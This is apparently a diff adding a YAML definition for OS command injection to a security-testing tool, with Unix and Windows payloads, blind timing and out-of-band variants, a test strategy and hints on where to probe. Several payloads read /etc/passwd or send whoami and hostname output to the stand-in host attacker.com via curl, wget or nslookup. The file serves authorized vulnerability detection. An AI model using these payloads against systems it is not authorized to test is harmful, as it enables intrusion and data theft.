@@ -1,0 +1,57 @@
+id: CMDI
+name: OS Command Injection
+cwe:
+- CWE-78
+owasp: A03:2021 Injection
+severity_range: Critical
+description: User input is passed to OS shell commands, allowing arbitrary command execution on the server.
+detection:
+  payloads:
+    unix:
+    - ; id
+    - '| id'
+    - '|| id'
+    - '& id'
+    - '&& id'
+    - $(id)
+    - '`id`'
+    - ; whoami
+    - '| whoami'
+    - "\n id"
+    - ; cat /etc/passwd
+    - '| curl http://attacker.com/?x=$(whoami)'
+    windows:
+    - '& dir'
+    - '| dir'
+    - '|| dir'
+    - '&& dir'
+    - '& whoami'
+    - '| whoami'
+    - ; type C:\windows\win.ini
+    - '& ping -n 5 127.0.0.1'
+    blind_time:
+    - ; sleep 5
+    - '| sleep 5'
+    - '& ping -c 5 127.0.0.1'
+    - $(sleep 5)
+    - '`sleep 5`'
+    blind_oob:
+    - ; curl http://attacker.com/$(whoami)
+    - '| nslookup attacker.com'
+    - ; wget http://attacker.com/?x=$(cat /etc/hostname)
+  strategy:
+  - 1. Identify inputs that could reach shell commands (filenames, hostnames, IPs, email addresses)
+  - '2. Test with command separators: ; | || & && \n'
+  - '3. Test with command substitution: $() and ``'
+  - 4. If no visible output, test blind via sleep/ping timing
+  - 5. If no timing difference, test blind via OOB DNS/HTTP callback
+  - '6. Look for common vulnerable patterns: ping, nslookup, whois, file conversion, image processing'
+evidence_needed: Command output in response (id, whoami, /etc/passwd), timing delay, or OOB callback
+ai_research_hints:
+- Check file upload endpoints that process files with shell commands (ImageMagick, ffmpeg)
+- Test email functionality — mail commands often use shell
+- Check monitoring/health-check features that may run system commands
+- Look for git integration endpoints (git clone with user-supplied URL)
+references:
+- https://portswigger.net/web-security/os-command-injection
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
